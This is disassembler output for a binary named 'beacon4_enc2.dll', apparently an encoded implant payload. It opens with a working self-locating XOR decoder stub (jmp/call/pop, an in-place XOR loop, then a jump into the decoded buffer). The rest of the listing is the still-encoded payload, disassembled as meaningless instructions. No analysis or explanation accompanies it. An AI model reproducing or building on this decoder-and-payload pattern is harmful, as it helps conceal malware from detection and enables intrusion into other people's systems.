
output/beacon4_enc2.dll:     file format binary


Disassembly of section .data:

00000000 <.data>:
       0:	eb 25                	jmp    0x27
       2:	58                   	pop    %eax
       3:	60                   	pusha  
       4:	8b 48 04             	mov    0x4(%eax),%ecx
       7:	33 08                	xor    (%eax),%ecx
       9:	8b f9                	mov    %ecx,%edi
       b:	c1 e9 02             	shr    $0x2,%ecx
       e:	8b 5c 07 04          	mov    0x4(%edi,%eax,1),%ebx
      12:	31 5c 07 08          	xor    %ebx,0x8(%edi,%eax,1)
      16:	83 ef 04             	sub    $0x4,%edi
      19:	49                   	dec    %ecx
      1a:	75 f2                	jne    0xe
      1c:	8b 18                	mov    (%eax),%ebx
      1e:	31 58 08             	xor    %ebx,0x8(%eax)
      21:	61                   	popa   
      22:	83 c0 08             	add    $0x8,%eax
      25:	ff e0                	jmp    *%eax
      27:	e8 d6 ff ff ff       	call   0x2
      2c:	24 8e                	and    $0x8e,%al
      2e:	cd 58                	int    $0x58
      30:	24 a6                	and    $0xa6,%al
      32:	ce                   	into   
      33:	58                   	pop    %eax
      34:	69 d4 25 58 69 d4    	imul   $0xd4695825,%esp,%edx
      3a:	25 03 3b 91 70       	and    $0x70913b03,%eax
      3f:	8a de                	mov    %dh,%bl
      41:	10 b3 f8 5e 10 b3    	adc    %dh,-0x4cefa108(%ebx)
      47:	07                   	pop    %es
